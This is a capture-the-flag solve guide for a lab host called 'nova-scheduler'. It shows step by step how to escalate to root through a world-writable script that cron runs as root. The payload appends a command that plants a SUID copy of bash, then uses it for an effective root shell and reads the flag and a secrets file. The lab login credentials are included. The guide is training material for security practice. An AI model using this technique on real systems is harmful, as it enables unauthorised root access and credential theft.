# 🔴 Red Team — M4: nova-scheduler Solve Guide

**Challenge:** World-Writable Cron Script → Root Privilege Escalation  
**Technique:** T1053.003 — Scheduled Task/Job: Cron  
**Entry Point:** SSH as `backupp` / `Backups3cure`

**Validated M4 address for this single-host deployment:** `10.0.2.15`

---

## Step 1 — SSH Login

First verify the local address:

```bash
ip -4 addr show
```

![M4 host address](screenshots/m4_red_01_ip.png)

Connect to the validated M4 address:

```bash
ssh -o StrictHostKeyChecking=no backupp@10.0.2.15
# Password: Backups3cure
```

![SSH login as backupp](screenshots/m4_red_02_ssh.png)

---

## Step 2 — Enumerate Cron Jobs

```bash
cat /etc/crontab
```

![Cron configuration](screenshots/m4_red_03_crontab.png)

Confirm the target entry directly:

```bash
grep 'maintenance.sh' /etc/crontab
```

![Root maintenance cron entry](screenshots/m4_red_03_cron_entry.png)

```bash
ls -la /etc/cron* /var/spool/cron/ 2>/dev/null
```

![Cron directories](screenshots/m4_red_04_cron_dirs.png)

Output:
```
* * * * * root /opt/scripts/maintenance.sh
```

---

## Step 3 — Check File Permissions

```bash
ls -la /opt/scripts/maintenance.sh
```

![World-writable maintenance script](screenshots/m4_red_05_permissions.png)

Output:
```
-rwxrwxrwx 1 root root ... /opt/scripts/maintenance.sh
```

The file is **world-writable** (777) but executed as root every minute!

---

## Step 4 — Exploit: SUID Bash Copy

Append a payload to copy bash with SUID bit:

```bash
echo 'cp /bin/bash /tmp/.suid_bash; chmod +s /tmp/.suid_bash' >> /opt/scripts/maintenance.sh
```

![Cron payload](screenshots/m4_red_06_payload.png)

---

## Step 5 — Wait for Cron (up to 60 seconds)

```bash
for i in 1 2 3; do ls -la /tmp/.suid_bash; sleep 1; done
# Wait until you see -rwsr-xr-x (SUID set by root cron)
```

![SUID file created in /tmp](screenshots/m4_red_07_watch.png)

On this Kali host, `/tmp` is mounted with `nosuid`, so the file mode is visible but executing it does not produce an effective root shell. Verify the mount and use `/var/tmp`, which is on a suid-enabled filesystem:

```bash
findmnt -no TARGET,OPTIONS -T /var/tmp
```

![SUID-enabled fallback filesystem](screenshots/m4_red_12_var_tmp_mount.png)

```bash
echo 'cp /bin/bash /var/tmp/.suid_bash; chmod +s /var/tmp/.suid_bash' >> /opt/scripts/maintenance.sh
```

![Validated fallback cron payload](screenshots/m4_red_13_var_tmp_payload.png)

```bash
for i in 1 2 3; do ls -la /var/tmp/.suid_bash; sleep 1; done
```

![Fallback SUID file created](screenshots/m4_red_14_var_tmp_watch.png)

---

## Step 6 — Get Root Shell

```bash
/var/tmp/.suid_bash -p  # -p flag preserves effective UID (root)
```

![Root shell through SUID bash](screenshots/m4_red_15_root_shell.png)

```bash
whoami
```

![Root shell identity](screenshots/m4_red_15_root_shell_whoami.png)

```bash
id
```

![Root shell UID details](screenshots/m4_red_15_root_shell_id.png)

The shell's real UID remains `backupp`, but `whoami` reports `root` and `id` shows `euid=0`, which confirms the effective root shell.

---

## Step 7 — Read Flag and Credentials

```bash
cat /root/flag4.txt
```

![M4 flag](screenshots/m4_red_16_flag.png)

```bash
cat /root/secrets.txt
```

![M5 credentials](screenshots/m4_red_17_secrets.png)

---

## Flag Location
`/root/flag4.txt`
